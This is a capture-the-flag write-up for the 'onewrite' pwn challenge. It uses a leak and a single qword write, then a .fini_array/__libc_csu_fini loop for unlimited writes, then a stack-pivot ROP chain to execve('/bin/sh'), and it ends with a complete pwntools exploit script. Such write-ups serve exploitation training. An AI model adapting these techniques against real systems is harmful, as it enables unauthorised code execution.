# Onewrite  
![image](https://github.com/user-attachments/assets/a70ae345-f8c9-434e-85d7-2b63c022f659)  

Let's run the binary and see what happens.  

![image](https://github.com/user-attachments/assets/0ea49573-13f7-4e5b-b1b3-75c2e04f8218)  
It seems we are given the opportunity to leak something and then do `OneWriteTM`  
Lets look at the binary on Ghidra to confirm.  

```c
void main(void)

{
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  puts("All you need to pwn nowadays is a leak and a qword write they say...");
  do_leak();
  return;
}

void do_leak(void)

{
  long lVar1;
  undefined auStack_18 [8];
  code *local_10;
  
  local_10 = do_leak;
  puts("What do you want to leak ?");
  puts("1. stack");
  puts("2. pie");
  printf(" > ");
  lVar1 = read_int();
  if (lVar1 == 1) {
    printf("%p\n",auStack_18);
  }
  else if (lVar1 == 2) {
    printf("%p\n",local_10);
  }
  else {
    puts("Nope");
  }
  do_overwrite();
  return;
}

void do_overwrite(void)

{
  void *__buf;
  
  printf("address : ");
  __buf = (void *)read_int();
  printf("data : ");
  read(0,__buf,8);
  return;
}
```
Looking over the functions, what they do is pretty straightforward. 
`do_leak`: leak either the address of `do_leak` or the address of the stack. This lets us bypass PIE or ASLR respectively.  
`do_overwrite`: asks for data and an address and then writes that data to the address.  

When deciding what to leak and where to write, the first move is not too complicated to see. If we leak ASLR we can then write into the stack, overwriting the return address.  
Controlling the return address allows us to jump back into `do_leak`, then leaking PIE.  

```python
io.recvuntil(b'pie')
io.readline()

io.sendline(b'1')
io.recvuntil(b'> ')
stack_leak = io.readline()[:-1]

log.success(stack_leak)

stack_leak = int(stack_leak,16)

ret_addr = stack_leak +0x18

io.send(str(ret_addr))
io.send(b'\x04')


io.recvuntil(b'pie')
io.readline()

io.sendline(b'2')
io.recvuntil(b'> ')
pie_leak = io.readline()[:-1]

log.success(pie_leak)
pie_leak = int(pie_leak,16)

exe.address =   pie_leak - exe.sym['do_leak']
```
The location of the return address can be found out using gdb quite easily.  
What do we do now? We can keep jumping into `do_overwrite`, but that consumes our only write.  
For this, we can abuse `.fini_array`. This is an array of pointers to functions that will be called once the program exits. 
```
                             //
                             // .fini_array 
                             // SHT_FINI_ARRAY  [0x2adfb0 - 0x2adfbf]
                             // ram:003adfb0-ram:003adfbf
                             //
                             __DT_FINI_ARRAY                                 XREF[5]:     __libc_csu_init:001097cc(*), 
                             __fini_array_start                                           __libc_csu_fini:00109818(*), 
                             __init_array_end                                             __libc_csu_fini:00109838(R), 
                             __do_global_dtors_aux_fini_array_entry                       003b0da0(*), 
                                                                                          _elfSectionHeaders::00000550(*)  
        003adfb0 50 89 10        addr       __do_global_dtors_aux
                 00 00 00 
                 00 00
                             PTR_fini_003adfb8                               XREF[1]:     __libc_csu_fini:00109838(R)  
        003adfb8 b0 83 10        addr       fini
                 00 00 00 
                 00 00
```
We can see here that there are two entries in `.fini_array`. Which means we could potentially call two functions of our choice if we controlled this array.  
The function responsible of calling the functions in the `.fini_array` is `__libc_csu_fini`. 
The idea is the following:
1. Overwrite the first entry to the `.fini_array` with `do_overwrite`
2. when the program ends, we will get an additional write as the first function from `.fini_array` is called. We will use that write primitive to overwrite the second entry in `.fini_array` with `do_overwrite` 
3. Now the second entry in `.fini_array` will be called. At the moment both entries of `.fini_array` give us writes. we will use our current write to write `__libc_csu_fini` to the return address of `__libc_csu_fini` so that we can trigger the functions in the fini array again.

From now on we can use the first write to do whatever we want and the second write to initiate the `.fini_array` loop again. We can do this as long as we want to get as many writes as we want. The only catch is that since we are clobbering the stack, the return address of `__libc_csu_fini` increases by 8 every time.  
```python
def write(addr, val, io=io):
    io.send(str(addr))
    io.send(p64(val))
    io.clean()

write(exe.sym['do_leak']+0x2a559b+8, exe.sym["do_overwrite"])
print(hex(exe.sym['do_leak']+0x2a559b))
write(exe.sym['do_leak']+0x2a559b, exe.sym["do_overwrite"])
csiRet = stack_leak-72 
write(csiRet,exe.sym['__libc_csu_fini'])

csiRet += 8 

def writeLoop(addr, val):
    global csiRet
    write(addr, val)
    write(csiRet, exe.sym['__libc_csu_fini'])
    csiRet += 8
```

Now that we have infinite writes we want to transform this into a shell. We will do a regular ropchain.  
```
pop rdi ptr to "/bin/sh";   ret
pop rsi 0 ; ret
pop rdx 0 ; ret
pop rax 0x59 ; ret
syscall
```
However, we dont have direct control of the stack. We can write our ropchain to an address that will not get clobbered and then use a stack pivot gadget to move rsp into our ropchain.  
```python
# 0x000000000001032b: add rsp, 0xd8; ret;
stackPivot = exe.address + 0x000000000001032b
```
I found that stack pivot gadget using `ropper`, which indicates where to write our ropchain.  
The rest is normal rop stuff. The exact offsets I found playing in GDB.  

```python
# 0x000000000001032b: add rsp, 0xd8; ret;
stackPivot = exe.address + 0x000000000001032b
# 0x00000000000084fa: pop rdi; ret;
popRdi = exe.address + 0x084fa
#0x000000000000d9f2: pop rsi; ret;
popRsi = exe.address + 0x000000000000d9f2
# 0x00000000000484c5: pop rdx; ret;
popRdx = exe.address + 0x00000000000484c5
# 0x00000000000460ac: pop rax; ret;
popRax = exe.address + 0x00000000000460ac
# 0x000000000000917c: syscall;
syscall = exe.address + 0x917c 
# 0x0000000000008076: ret;
ret = exe.address + 0x0000000000008076

binshAdr = exe.address + 0x2b33b0
# first wite "/bin/sh" to the designated place in memory
writeLoop(binshAdr, u64("/bin/sh\x00"))

log.info("binsh at "+hex(binshAdr))
'''
pop rdi ptr to "/bin/sh";   ret
pop rsi 0 ; ret
pop rdx 0 ; ret
pop rax 0x59 ; ret
syscall
'''

# write ropchain into memory
writeLoop(stack_leak+0xd0, ret)
writeLoop(stack_leak+0xd8, popRdi)
writeLoop(stack_leak+0xe0, binshAdr)
writeLoop(stack_leak+0xe8, popRsi)
writeLoop(stack_leak+0xf0, 0)
writeLoop(stack_leak+0xf8, popRdx)
writeLoop(stack_leak+0x100, 0)
writeLoop(stack_leak+0x108, popRax)
writeLoop(stack_leak+0x110, 59)
writeLoop(stack_leak+0x118, syscall)

#write stack pivot gadget into return address
write(stack_leak-0x8, stackPivot)
```

And that is it!  
![image](https://github.com/user-attachments/assets/f5090907-58ea-413b-901b-d4d915dcf2a3)

full exploit code:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template onewrite
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'onewrite')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

    

io = start()

def write(addr, val, io=io):
    io.send(str(addr))
    io.send(p64(val))
    io.clean()

io.recvuntil(b'pie')
io.readline()

io.sendline(b'1')
io.recvuntil(b'> ')
stack_leak = io.readline()[:-1]

log.success(stack_leak)

stack_leak = int(stack_leak,16)

ret_addr = stack_leak +0x18

io.send(str(ret_addr))
io.send(b'\x04')


io.recvuntil(b'pie')
io.readline()

io.sendline(b'2')
io.recvuntil(b'> ')
pie_leak = io.readline()[:-1]

log.success(pie_leak)
pie_leak = int(pie_leak,16)

exe.address =   pie_leak - exe.sym['do_leak']

write(exe.sym['do_leak']+0x2a559b+8, exe.sym["do_overwrite"])
print(hex(exe.sym['do_leak']+0x2a559b))
write(exe.sym['do_leak']+0x2a559b, exe.sym["do_overwrite"])
csiRet = stack_leak-72 
write(csiRet,exe.sym['__libc_csu_fini'])

csiRet += 8 

def writeLoop(addr, val):
    global csiRet
    write(addr, val)
    write(csiRet, exe.sym['__libc_csu_fini'])
    csiRet += 8

# 0x000000000001032b: add rsp, 0xd8; ret;
stackPivot = exe.address + 0x000000000001032b
# 0x00000000000084fa: pop rdi; ret;
popRdi = exe.address + 0x084fa
#0x000000000000d9f2: pop rsi; ret;
popRsi = exe.address + 0x000000000000d9f2
# 0x00000000000484c5: pop rdx; ret;
popRdx = exe.address + 0x00000000000484c5
# 0x00000000000460ac: pop rax; ret;
popRax = exe.address + 0x00000000000460ac
# 0x000000000000917c: syscall;
syscall = exe.address + 0x917c 
# 0x0000000000008076: ret;
ret = exe.address + 0x0000000000008076

binshAdr = exe.address + 0x2b33b0
# first wite "/bin/sh" to the designated place in memory
writeLoop(binshAdr, u64("/bin/sh\x00"))

log.info("binsh at "+hex(binshAdr))
'''
pop rdi ptr to "/bin/sh";   ret
pop rsi 0 ; ret
pop rdx 0 ; ret
pop rax 0x59 ; ret
syscall
'''

# write ropchain into memory
writeLoop(stack_leak+0xd0, ret)
writeLoop(stack_leak+0xd8, popRdi)
writeLoop(stack_leak+0xe0, binshAdr)
writeLoop(stack_leak+0xe8, popRsi)
writeLoop(stack_leak+0xf0, 0)
writeLoop(stack_leak+0xf8, popRdx)
writeLoop(stack_leak+0x100, 0)
writeLoop(stack_leak+0x108, popRax)
writeLoop(stack_leak+0x110, 59)
writeLoop(stack_leak+0x118, syscall)

#write stack pivot gadget into return address
write(stack_leak-0x8, stackPivot)
log.info("writing stack pivot gadget to "+hex(stack_leak-0x8))
log.info("Stack pivot gadget is "+hex(stackPivot))
io.interactive()
```



